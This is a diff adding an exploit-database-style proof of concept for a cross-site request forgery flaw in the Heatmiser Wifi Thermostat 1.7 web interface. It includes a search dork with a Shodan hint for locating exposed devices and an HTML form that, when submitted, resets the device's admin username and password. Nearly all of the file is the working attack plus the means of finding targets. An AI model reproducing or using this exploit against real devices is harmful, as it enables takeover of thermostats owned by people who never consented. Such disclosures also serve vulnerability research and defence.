@@ -1,0 +1,17 @@
+# Exploit Title: Heatmiser Wifi Thermostat 1.7 - Cross-Site Request Forgery
+# Dork: intitle:"Heatmiser Wifi Thermostat" & you can use shodan
+# Date: 2019-01-09
+# Exploit Author: sajjadbnd
+# Vendor Lnk: https://www.heatmiser.com/en/ 
+# Product Link: https://www.heatmiser.com/en/wireless-thermostats/
+# Tested on: Heatmiser Version 1.7
+# CVE: N/A
+
+# [+] CSRF: Change Admin Username and Password
+
+<form method="post" name="config" action="http://target:8083/networkSetup.htm">
+Name:<input type="text" name="usnm" maxlength="16" value="s" onchange="textchange()"> 
+Password:<input type="password" maxlength="16" style="width:150px;" name="usps" >
+Confirm User Password:<input type="password" maxlength="16" style="width:150px;" name="cfps" onchange="textchange()">
+<input id="btnSubmit" type="submit" class="sm" value=" Save " onclick="saveclick()">
+</form>
